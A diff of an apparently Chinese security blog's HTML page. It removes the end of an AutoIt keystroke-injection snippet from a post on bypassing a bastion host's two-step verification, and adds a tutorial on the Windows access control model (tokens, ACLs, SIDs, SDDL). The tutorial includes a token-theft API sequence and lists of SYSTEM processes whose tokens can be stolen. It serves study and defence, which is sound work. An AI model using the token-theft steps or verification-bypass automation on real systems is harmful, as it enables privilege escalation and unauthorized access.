-<span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
-<span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_RESTORE</span><span class="p">)</span>
-<span class="k">Else</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_HIDE</span><span class="p">)</span>
-<span class="n">EndIf</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;+{INS}&#34;</span><span class="p">)</span>
-<span class="p">;</span><span class="n">Sleep</span><span class="p">(</span><span class="n">3000</span><span class="p">)</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;{enter}&#34;</span><span class="p">)</span>
-<span class="n">Sleep</span><span class="p">(</span><span class="n">300</span><span class="p">)</span>
-<span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
-<span class="k">Else</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_SHOW</span><span class="p">)</span>
-<span class="n">EndIf</span>
-<span class="n">ControlFocus</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-<span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
-</div>
-</div>
+<h3 id="令牌的利用"><a href="#令牌的利用" class="anchor-link">#</a><a href="#contents:令牌的利用" class="headings">令牌的利用</a></h3>
+<ol>
+<li><strong>假冒/窃取令牌:</strong> 攻击者创建一个新的访问令牌，该令牌使用 DuplicateToken(Ex) 复制现有令牌。</li>
+<li><strong>使用令牌创建进程:</strong> 攻击者创建一个新的访问令牌，并使用它创建一个在模拟用户的安全上下文下运行的新进程。</li>
+<li><strong>制作和模拟令牌:</strong> 拥有用户名和密码，但用户未登录系统。攻击者可以使用该功能为用户创建登录会话。</li>
+</ol>
+<p>一般的利用流程为：</p>
+<pre tabindex="0"><code>WindowsPrincipal：判断当前权限
+LookupPrivilegeValue：判断是否拥有SeDebugPrivilege权限
+OpenProcess：打开进程获取句柄
+OpenProcessToken：打开进程令牌获取hToken
+DuplicateToken：复制令牌
+CreateProcessWithTokenW：启动进程
+</code></pre><p>使用 <code>PROCESS_QUERY_INFORMATION</code> 或 <code>PROCESS_ALL_ACCESS</code> 的访问权限对某些 SYSTEM 进程调用 <code>OpenProcess()</code> 时，可以成功窃取这些进程的访问令牌。</p>
+<pre tabindex="0"><code>dllhost.exe
+lsass.exe 
+OfficeClickToRun.exe 
+svchost.exe(只适用于某些PID)
+Sysmon64.exe
+unsecapp.exe 
+VGAuthService.exe
+vmacthlp.exe 
+vmtoolsd.exe 
+winlogon.exe
+</code></pre><p>对于受 PPL 保护的某些 SYSTEM 进程，如果以 <code>PROCESS_QUERY_LIMITED_INFORMATION</code> 访问权限调用 <code>OpenProcess()</code>，还是能够窃取访问令牌，这些进程包括：</p>
+<pre tabindex="0"><code>csrss.exe
+Memory Compression.exe 
+services.exe
+smss.exe
+wininit.exe
+</code></pre><p>如果想在某个进程上调用<code>OpenProcessToken()</code>，那么BUILTIN\Administrator必须为TokenOwner</p>
+<h2 id="安全描述符"><a href="#安全描述符" class="anchor-link">#</a><a href="#contents:安全描述符" class="headings">安全描述符</a></h2>
+<p>安全描述符包含了与对象有关的安全信息。安全描述符由<code>SECURITY_DESCRIPTOR</code>结构体组成。一个安全描述符包含了以下内容:</p>
+<ul>
+<li>对象的所有者与所在主要组的SID</li>
+<li>DACL—指定了特定用户或组的访问权限。（拒绝或允许）</li>
+<li>SACL—指定了对对象进行访问的类型，并生成审计记录。</li>
+<li>一系列的控制bit位，用于限定安全描述符或它的单个成员的含义。</li>
+</ul>
+<h3 id="为新对象创建权限"><a href="#为新对象创建权限" class="anchor-link">#</a><a href="#contents:为新对象创建权限" class="headings">为新对象创建权限</a></h3>
+<ol>
+<li>
+<p><strong>新对象的DACL</strong></p>
+<ul>
+<li>新对象的DACL可由对象的创建者指定。在安全描述符的<code>SE_DACL_PROTECTED</code>控制位没有被设置的情况下，系统会合并可继承的ACE和创建者指定的DACL。</li>
+<li>如果创建者没有指定安全描述符，系统会利用可继承的ACE来创建新对象的DACL。</li>
+<li>如果既没有指定安全描述符，也没有可继承的ACE。那么对象的DACL会被设置成创建者的主令牌或模拟令牌中的默认DACL。</li>
+<li>如果上面三个都没有，那么系统会创建没有DACL的对象。这样所有人都有权限访问该对象。</li>
+</ul>
+</li>
+<li>
+<p><strong>新对象的SACL</strong></p>
+<ul>
+<li>第一条同DACL的创建规则。只是来自父类的<code>SYSTEM_RESOURCE_ATTRIBUTE_ACEs</code>和 <code>SYSTEM_SCOPED_POLICY_ID_ACEs</code>始终会被合并到新对象中，即使<code>SE_DACL_PROTECTED</code>位被设置。</li>
+<li>如果创建者没有指定安全描述符，系统根据可继承的ACE 创建对象的SACL。</li>
+<li>如果没有指定SACL和存在可继承的SACL，那么对象就没有SACL。</li>
+</ul>
+<p>对新对象指定SACL，需要对象的创建者开启<code>SE_SECURITY_NAME</code>特权。如果指定的SACL只包含<code>SYSTEM_RESOURCE_ATTRIBUTE_ACEs</code>或对象的SACL全是继承的ACE，那么就不需要此特权。</p>
+</li>
+<li>
+<p><strong>新对象的所有者</strong></p>
+<ul>
+<li>对象的所有者默认有对象的<code>WRITE_DAC</code>权限，代表对象的所有者可以编辑对象的DACL。</li>
+<li>新对象的所有者是来自创建进程的主令牌或模拟令牌中的所有者SID。可使用<code>SetTokenInformation</code>函数来设置访问令牌的默认所有者。</li>
+<li>启用了<code>SE_TAKE_OWNERSHIP</code>权限的进程能将它自己设置为对象的所有者。拥有<code>SE_RESTORE_NAME</code>权限或对对象有<code>WRITE_OWNER</code>权限的进程能够将任何有效用户或组SID设置为对象的所有者。</li>
+</ul>
+</li>
+<li>
+<p><strong>新对象的主要组</strong></p>
+<p>对象的创建者可以指定新对象的主要组，如果没有被指定，那会被设置为创建者主令牌或模拟令牌中的主要组。</p>
+</li>
+</ol>
+<h3 id="acl"><a href="#acl" class="anchor-link">#</a><a href="#contents:acl" class="headings">ACL</a></h3>
+<p>一个ACL 是由 ACE 组成的列表。在ACL中的每个ACE 用于标识用户和指定对此用户的允许、拒绝、审计等访问权限。安全描述符包含两种类型的ACL: <code>DACL、SACL</code>。</p>
+<p>DACL 标识了用户对对象的访问是被允许或被拒绝。当进程尝试访问安全对象时，系统会检查对象的 DACL 中的 ACE 以决定是否授予访问权限。</p>
+<p>SACL 允许管理员记录访问对象的日志。每个ACE 指定了某个用户尝试获取对象的类型。当访问尝试失败时，SACL 中的ACE 能够生成审计日志。</p>
+<h3 id="ace"><a href="#ace" class="anchor-link">#</a><a href="#contents:ace" class="headings">ACE</a></h3>
+<p><em><strong>Tips:</strong></em> 受托人指用户账户、组账户和登录会话。</p>
+<p>一个ACL 能有零个或多个ACE。每个ACE 监控或控制指定受托人的访问。共有6中类型的ACE，其中有3个类型支持所有的安全对象，另外3个类型支持目录服务对象。</p>
+<p>所有类型的ACE包含了如下信息:</p>
+<ul>
+<li>一个SID 标识此条ACE 应用于哪个用户</li>
+<li>一个访问掩码用于指定此条ACE 的访问权限</li>
+<li>一个flag 用于表明此条ACE 的类型</li>
+<li>一系列的bit位用于决定子对象或容器是否能够继承ACE</li>
+</ul>
+<p>下面是所有安全对象可用的ACE 类型</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access-denied ACE</td>
+<td>在DACL中拒绝受托人访问</td>
+</tr>
+<tr>
+<td>Access-allowed ACE</td>
+<td>在DCAL中允许受托人访问</td>
+</tr>
+<tr>
+<td>System-audit ACE</td>
+<td>在SACL 中，当受托人尝试行使指定权限时生成审计记录</td>
+</tr>
+</tbody>
+</table></div>
+<p>目录服务（DS）对象支持特定对象的ACE。特定对象的ACE 包含一对GUID ，以此来扩展ACE。可参考 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces" target="_blank" rel="noopener">微软文档</a>。</p>
+<p>下面是特定对象的ACE类型</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access-denied object ACE</td>
+<td>在 DACL 中使用以拒绝用户访问对象上的属性或属性集，或将 ACE 继承限制为指定类型的子对象。使用ACCESS_DENIED_OBJECT_ACE结构。</td>
+</tr>
+<tr>
+<td>Access-allowed object ACE</td>
+<td>在 DACL 中使用以允许用户访问对象上的属性或属性集，或将 ACE 继承限制为指定类型的子对象。使用ACCESS_ALLOWED_OBJECT_ACE结构。</td>
+</tr>
+<tr>
+<td>System-audit object ACE</td>
+<td>在 SACL 中用于记录用户访问对象上的属性或属性集的尝试，或将 ACE 继承限制为指定类型的子对象。使用SYSTEM_AUDIT_OBJECT_ACE结构。</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>DACL 中ACE 的顺序</strong></p>
+<p>当进程尝试访问安全对象时，系统会逐步遍历对象的DACL中的ACE，直到找到允许或拒绝请求访问的 ACE。DACL 中对用户的访问权限可能因 DACL 中 ACE 的顺序而异。</p>
+<ol>
+<li>所有直接应用（这里的直接应用就是直接配置的意思）的ACE都被放在继承的ACE 之前。</li>
+<li>在所有直接应用的ACE中，表示拒绝的ACE 被放在表示允许的ACE 之前。</li>
+<li>继承的 ACE 按照它们被继承的顺序放置。首先是从子对象的父对象继承的 ACE，然后是从祖父对象继承的 ACE，依此类推。</li>
+<li>对于每一级继承的 ACE，拒绝访问的 ACE 放置在允许访问的 ACE 之前。</li>
+</ol>
+<h2 id="访问掩码与-sid"><a href="#访问掩码与-sid" class="anchor-link">#</a><a href="#contents:访问掩码与-sid" class="headings">访问掩码与 SID</a></h2>
+<h3 id="访问掩码"><a href="#访问掩码" class="anchor-link">#</a><a href="#contents:访问掩码" class="headings">访问掩码</a></h3>
+<p>访问掩码是一个32位的值，它的每个位对应于不同访问权限。其包含以下的访问权限位:</p>
+<ul>
+<li>通用访问权限</li>
+<li>标准访问权限</li>
+<li>SACL 权限</li>
+<li>目录服务访问权限</li>
+</ul>
+<p>当一个线程试图打开一个对象的句柄时，通常指定一个访问掩码来请求一组访问权限。所有的安全对象使用下图所示的访问掩码格式来安排其访问权限。
+<img src="/images/16433586167313.jpg" alt=""></p>
+<ol>
+<li>
+<p><strong>通用访问权限</strong></p>
+<p>安全对象在访问掩码中使用高四位来指定通用访问权限。所有类型的安全对象都会映射通用权限位到它的标准访问权限和特定对象访问权限。例如Windows 文件对象将 <code>GENERIC_READ</code> 位映射到 <code>READ_CONTROL</code>和 <code>SYNCHRONIZE</code>标准访问权限和 <code>FILE_READ_DATA</code>、<code>FILE_READ_EA</code>和 <code>FILE_READ_ATTRIBUTES</code>对象特定的访问权限。</p>
+<p>打开对象的句柄时，可以使用通用访问权限来指定所需的访问类型。</p>
+<p>下表显示了为通用访问权限定义的常量。</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Generic meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GENERIC_ALL</td>
+<td>所有可能的访问权限</td>
+</tr>
+<tr>
+<td>GENERIC_EXECUTE</td>
+<td>执行权限</td>
+</tr>
+<tr>
+<td>GENERIC_READ</td>
+<td>读取权限</td>
+</tr>
+<tr>
+<td>GENERIC_WRITE</td>
+<td>写权限</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>
+<p><strong>标准访问权限</strong></p>
+<p>Winnt.h 中定义了以下用于标准访问权限的 Windows 常量。</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DELETE</td>
+<td>删除对象的权利。</td>
+</tr>
+<tr>
+<td>READ_CONTROL</td>
+<td>读取对象安全描述符中信息的权限，不包括系统访问控制列表（SACL）中的信息。</td>
+</tr>
+<tr>
+<td>SYNCHRONIZE</td>
+<td>使用对象进行同步的权利。这使线程能够等待，直到对象处于信号状态。某些对象类型不支持此访问权限。</td>
+</tr>
+<tr>
+<td>WRITE_DAC</td>
+<td>修改对象安全描述符中的自由访问控制列表(DACL)的权利。</td>
+</tr>
+<tr>
+<td>WRITE_OWNER</td>
+<td>在对象的安全描述符中更改所有者的权利。</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>
+<p><strong>SACL 访问权限</strong></p>
+<p><code>ACCESS_SYSTEM_SECURITY</code>权限用于控制对SACL的读取或修改。只有在线程的访问令牌中启用了 <code>SE_SECURITY_NAME</code>权限时，系统才会授予此访问权限。</p>
+<p><code>ACCESS_SYSTEM_SECURITY</code>权限在 DACL 中无效，因为 DACL 不控制对 SACL 的访问。</p>
+</li>
+<li>
+<p><strong>目录服务访问权限</strong></p>
+<p>每个 Active Directory 对象都有一个安全描述符。可在安全描述符中设置一组特定于目录服务对象的权限。具体的权限列表参考<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/directory-services-access-rights" target="_blank" rel="noopener">微软文档</a></p>
+</li>
+</ol>
+<h3 id="安全标识符sid"><a href="#安全标识符sid" class="anchor-link">#</a><a href="#contents:安全标识符sid" class="headings">安全标识符（SID）</a></h3>
+<p>SID 的长度可变但值唯一，它用来标识当前用户。由权威机构（如域控）颁发，并存储在安全数据库中。每次用户登录时，系统都会从数据库中检索该用户的 SID，并将其放入该用户的访问令牌中。访问令牌中的 SID 用于与所有Windows 安全对象交互时识别用户。当 SID 已被用做用户或组的唯一标识符时，就不能再使用它来标识另一个用户或组。</p>
+<p>Windows 在以下安全元素中使用 SID：</p>
+<ul>
+<li>在安全描述符中标识对象和主要组的所有者</li>
+<li>在访问控制条目（ACE）中 标识允许、拒绝或审核访问的受托人</li>
+<li>在访问令牌中标识用户和用户所属的组</li>
+</ul>
+<p><strong>SID 的结构</strong></p>
+<ul>
+<li>SID结构的修订级别</li>
+<li>一个 48 位标识符权限值，用于标识颁发 SID 的权限</li>
+<li>可变数量的子授权或相对标识符 (RID) 值，用于唯一标识相对于颁发 SID 的授权的受托人</li>
+</ul>
+<p>通过标识符权限值和子权限值的组合来确保没有两个 SID 相同，即使两个不同的 SID 颁发机构发布相同的 RID 值组合也是如此。</p>
+<p>SID 以二进制格式存储在SID结构中。要显示 SID，您可以调用<code>ConvertSidToStringSid</code>函数将二进制 SID 转换为字符串格式。这些函数对 SID 使用以下标准化字符串表示法，这使得其组件的可视化变得更简单：</p>
+<p><code>S- R - I - S …</code> 字符&quot;S&quot;将一系列数字标识为 SID，R是修订级别，I是标识符权限值，而S ……是一个或多个子权限值。例如: <code>S-1-5-32-544</code> 代表</p>
+<ul>
+<li>修订级别为 1</li>
+<li>标识符权限值为 5 (<code>SECURITY_NT_AUTHORITY</code>)</li>
+<li>第一个子权限值为 32 (<code>SECURITY_BUILTIN_DOMAIN_RID</code>)</li>
+<li>第二个子权限值为 544 (<code>DOMAIN_ALIAS_RID_ADMINS</code>)</li>
+</ul>
+<h2 id="权限检查的过程"><a href="#权限检查的过程" class="anchor-link">#</a><a href="#contents:权限检查的过程" class="headings">权限检查的过程</a></h2>
+<p>当线程尝试访问安全对象时，系统要么授予访问权限，要么拒绝访问。如果对象没有自由访问控制列表(DACL)，则系统授予访问权限；否则系统会在对象的 DACL 中查找适用于该线程的访问控制项(ACE)。</p>
+<p>系统将每个 ACE 中的受托人与线程的访问令牌中标识的受托人进行比较。访问令牌包含标识用户和用户所属组帐户的安全标识符(SID)，还包含标识当前登录会话的登录 SID。在访问检查期间，系统会忽略未启用的组 SID。</p>
+<p>通常系统使用请求访问的线程的主要访问令牌。但是如果该线程正在模拟另一个用户，系统将使用该线程的模拟令牌。</p>
+<p>系统按顺序检查每个 ACE，直到发生以下事件之一：</p>
+<ul>
+<li>拒绝访问的 ACE 明确拒绝访问令牌中的受托者请求的任何访问权限。</li>
+<li>一个或多个允许访问的 ACE 明确授予线程的访问令牌中列出的受托者所有请求的访问权限。</li>
+<li>已检查所有 ACE，但仍有至少一项请求的访问权限未被明确允许，在这种情况下，访问将被隐式拒绝。</li>
+</ul>
+<p>下图显示了对象的 DACL 如何允许访问一个线程同时拒绝访问另一个线程。</p>
+<p><img src="/images/16433586650422.jpg" alt=""></p>
+<p>在访问检查中，系统将线程访问令牌中的安全信息与对象安全描述符中的安全信息进行比较。</p>
+<ul>
+<li>访问令牌包含与线程关联的用户的安全标识符(SID)。</li>
+<li>安全描述符标识对象的所有者并包含自由访问控制列表访问控制条目 (DACL)。DACL 包含ACE，每个条目指定允许或拒绝特定用户或组的访问权限。</li>
+</ul>
+<p>对于线程 A，系统读取 ACE 1 并立即拒绝访问，因为拒绝访问的 ACE 适用于线程访问令牌中的用户。在这种情况下，系统不检查 ACE 2 和 3。对于线程 B，ACE 1 不适用，因此系统继续执行允许写访问的 ACE 2 和允许读和执行访问的 ACE 3。</p>
+<p>因为当请求的访问被明确授予或拒绝时，系统会停止检查 ACE，所以 DACL 中 ACE 的顺序很重要。</p>
+<p>如果属于对象安全描述符的自由访问控制列表(DACL)设置为NULL，则会创建一个NULL DACL。NULL DACL 向任何请求它的用户授予完全访问权限；NULL DACL 和空DACL 不同，一个空的DACL 是正确分配和初始化的 DACL，但不包含访问控制条目(ACE)，空的 DACL 拒绝任何对象的访问权限。</p>
+<h2 id="安全描述符定义语言"><a href="#安全描述符定义语言" class="anchor-link">#</a><a href="#contents:安全描述符定义语言" class="headings">安全描述符定义语言</a></h2>
+<p>安全描述符定义语言 <code>Security Descriptor Definition Language（SDDL）</code>是用来将安全描述符表示为文本字符串。</p>
+<p><strong>安全描述符字符串格式</strong></p>
+<p>该格式是以null 结尾的字符串，指明了安全描述符的四个主要组件:</p>
+<pre tabindex="0"><code>O:owner_sid
+G:group_sid
+D:dacl_flags(string_ace1)(string_ace2)...
+S:sacl_flags(string_ace1)(string_ace2)...
+</code></pre><ol>
+<li><code>owner_sid</code> 标识对象所有者的sid</li>
+<li><code>group_sid</code> 标识对象主要组的sid，SID 字符串可以使用 SID (S-R-I-S-S) 的标准字符串形式表示或 Sddl.h 中定义的字符串常量之一表示，完整字符串常量见 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/sid-strings" target="_blank" rel="noopener">微软官方文档</a> 。</li>
+<li><code>dacl_flags</code> 适用于DACL的安全描述符的控制标志。dacl_flags 可以是以下字符串的串联。
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Constant in Sddl.h</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;P&quot;</td>
+<td>SDDL_PROTECTED</td>
+<td>SE_DACL_PROTECTED 标志被设置</td>
+</tr>
+<tr>
+<td>&quot;AR&quot;</td>
+<td>SDDL_AUTO_INHERIT_REQ</td>
+<td>SE_DACL_AUTO_INHERIT_REQ标志被设置</td>
+</tr>
+<tr>
+<td>&quot;AI&quot;</td>
+<td>SDDL_AUTO_INHERITED</td>
+<td>SE_DACL_AUTO_INHERITED标志被设置</td>
+</tr>
+<tr>
+<td>&quot;NO_ACCESS_CONTROL&quot;</td>
+<td>SDDL_NULL_ACL</td>
+<td>ACL 为 null。不适用于 Windows Server 2008, Windows Vista and Windows Server 2003</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li><code>sacl_flags</code> 适用于 SACL 的安全描述符控制标志， 与 dacl_flags相同 。</li>
+</ol>
+<p>着重说一下<code>string_ace</code> ，它用于描述DACL 或SACL 中的ACE 字符串。</p>
+<p>ACE 格式:</p>
+<pre tabindex="0"><code>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
+ACE类型（允许/拒绝/审核）：ACE标志（继承和审计）：权限列表：对象GUID：继承的对象GUID：受托人
+</code></pre><p>例如ACE： ****<code>A;CIID;GW;;;S-1-5-21-1812960810-2335050734-3517558805-1103</code></p>
+<pre tabindex="0"><code>A;  表示允许
+CI; 容器继承
+GW; 通用写权限
+; 对象类型
+; 继承的对象类型
+S-1-5-21-1812960810-2335050734-3517558805-1103 受托人SID  CO:Creator Owner 许多SID都有速记符号
+</code></pre><p>表示允许sid为<code>S-1-5-21-1812960810-2335050734-3517558805-1103</code>的用户拥有GW权限，且权限可以被继承（CI）</p>
+<ul>
+<li>
+<p><strong>ACE 类型与继承类型</strong>: （仅列举常见的，详细可参考 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings" target="_blank" rel="noopener">微软官方文档</a> 或 <a href="https://clan8blog.wordpress.com/2016/08/08/sddl-explained/" target="_blank" rel="noopener">SDDL Explained</a>）</p>
+<p><strong>ACE类型</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>允许访问</td>
+</tr>
+<tr>
+<td>D</td>
+<td>拒绝访问</td>
+</tr>
+<tr>
+<td>OA</td>
+<td>允许对象访问: 仅适用于对象的一个子集。</td>
+</tr>
+<tr>
+<td>OD</td>
+<td>对象访问被拒绝: 仅适用于对象的一个子集。</td>
+</tr>
+<tr>
+<td>AU</td>
+<td>系统审计（SACL）</td>
+</tr>
+<tr>
+<td>AL</td>
+<td>系统报警（SACL）</td>
+</tr>
+<tr>
+<td>OU</td>
+<td>对象系统审计（SACL）</td>
+</tr>
+<tr>
+<td>OL</td>
+<td>对象系统警报（SACL）</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>ACE标志</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CI</td>
+<td>容器继承: 容器的子对象（如目录）将ACE作为显式ACE继承</td>
+</tr>
+<tr>
+<td>OI</td>
+<td>对象继承: 不是容器的子对象将ACE作为显式ACE继承</td>
+</tr>
+<tr>
+<td>IO</td>
+<td>仅继承: ACE不会应用于当前对象，仅通过继承影响子对象</td>
+</tr>
+<tr>
+<td>NP</td>
+<td>没有传播的继承: 只有直接的下级子对象继承这个ACE（子对象的子对象是不继承的）</td>
+</tr>
+<tr>
+<td>ID</td>
+<td>ACE是继承的</td>
+</tr>
+<tr>
+<td>SA</td>
+<td>成功的访问审核（SACL）</td>
+</tr>
+<tr>
+<td>FA</td>
+<td>失败的问审核（SACL）</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>
+<p><strong>权限列表</strong></p>
+<p><strong>通用权限（<strong>就是对这个条目的通用权限，通用读，通用写等</strong>）</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Description</th>
+<th>Hex</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GA</td>
+<td>所有通用权限</td>
+<td>0x10000000</td>
+</tr>
+<tr>
+<td>GR</td>
+<td>通用读取权限</td>
+<td>0x80000000</td>
+</tr>
+<tr>
+<td>GW</td>
+<td>通用写入权限</td>
+<td>0x40000000</td>
+</tr>
+<tr>
+<td>GX</td>
+<td>通用执行权限</td>
+<td>0x20000000</td>
+</tr>
+</tbody>
+</table></div>
+<p>还有标准权限、目录服务对象权限、文件权限、注册表键值权限等等，详细可参考 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings" target="_blank" rel="noopener">微软官方文档</a> 或 <a href="https://clan8blog.wordpress.com/2016/08/08/sddl-explained/" target="_blank" rel="noopener">SDDL Explained</a>。</p>
+</li>
+<li>
+<p><strong>object_guid</strong></p>
+<p>指明在特定于对象的 ACE 结构中<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces" target="_blank" rel="noopener">ObjectType</a> 成员的值。</p>
+<p>对某个属性的权限或者扩展权限是用GUID表示的（域内）。如果object_guid 表示为属性的GUID，那么此条ACE 表示用户对该属性的权限。如果object_guid为扩展权限的GUID，那么此条ACE 代表用户拥有该扩展权限。</p>
+<p>下表列出了一些密码相关扩展权限的 GUID，更多参考 <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/extended-rights" target="_blank" rel="noopener">微软文档</a>。</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>权限和GUID</th>
+<th>扩展权限含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CR;ab721a53-1e2f-11d0-9819-00aa0040529b</td>
+<td>Change password</td>
+</tr>
+<tr>
+<td>CR;00299570-246d-11d0-a768-00aa006e0529</td>
+<td>Reset password</td>
+</tr>
+</tbody>
+</table></div>
+<p>例如此条ACE 表示此用户有重置密码的权限。</p>
+<pre tabindex="0"><code>OA; 对象允许
+;
+CR;表明对对象执行扩展权限检查，此标志与特定扩展权限（如下的重置密码GUID）结合使用执行特定扩展权限检查
+00299570-246d-11d0-a768-00aa006e0529; 重置密码的GUID
+;
+S-1-5-21-1812960810-2335050734-3517558805-1178 受托人SID
+</code></pre><ol>
+<li>
+<p>根据GUID查<strong>扩展权限名</strong></p>
+<p><code>adfind -b &quot;CN=Extended-Rights,CN=Configuration,DC=rootkit,DC=org&quot; -f &quot;rightsGuid=00299570-246d-11d0-a768-00aa006e0529&quot; name</code></p>
+</li>
+<li>
+<p>可根据GUID查具体属性的名字，所有属性名都存储在结构分区里面。 （属性名参考 <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/attributes-all" target="_blank" rel="noopener">微软文档</a>）</p>
+<p><code>adfind -schema -f &quot;schemaIDGUID={{GUID:BF9679C0-0DE6-11D0-A285-00AA003049E2}}&quot; -binenc name</code></p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>inherit_object_guid</strong></p>
+<p>指明在特定于对象的 ACE 结构中<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces" target="_blank" rel="noopener">InheritedObjectType</a> 成员的值。</p>
+</li>
+</ul>
+<p>安全描述符 <code>O:AOG:DAD:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-0-0)</code> 表示的意义:</p>
+<pre tabindex="0"><code>Revision:  0x00000001
+    Control:   0x0004
+        SE_DACL_PRESENT
+    Owner: (S-1-5-32-548)
+    PrimaryGroup: (S-1-5-21-397955417-626881126-188441444-512)
+DACL
+    Revision: 0x02
+    Size:     0x001c
+    AceCount: 0x0001
+    Ace[00]
+        AceType:       0x00 (ACCESS_ALLOWED_ACE_TYPE)
+        AceSize:       0x0014
+        InheritFlags:  0x00
+        Access Mask:   0x100e003f
+                            READ_CONTROL
+                            WRITE_DAC
+                            WRITE_OWNER
+                            GENERIC_ALL
+                            Others(0x0000003f)
+        Ace Sid      : (S-1-0-0)
+SACL
+    Not present
+</code></pre>
             </div>
 
             
@@ -442,7 +916,7 @@
                 
                 
                 
-                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" target="_blank" rel="noopener">https://myzxcg.com/2021/01/AutoIt-SendKey绕过堡垒机两步验证/</a></li>
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%B8%80/" target="_blank" rel="noopener">https://myzxcg.com/2021/08/Windows-访问控制模型一/</a></li>
             
             <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
             
@@ -472,10 +946,6 @@
             <ul class="related-list">
                 
                     <li class="related-item">
-                        <a href="/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="related-link">利用.NET 反序列化做权限维持</a>
-                    </li>
-                
-                    <li class="related-item">
                         <a href="/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" class="related-link">域委派利用</a>
                     </li>
                 
@@ -491,6 +961,10 @@
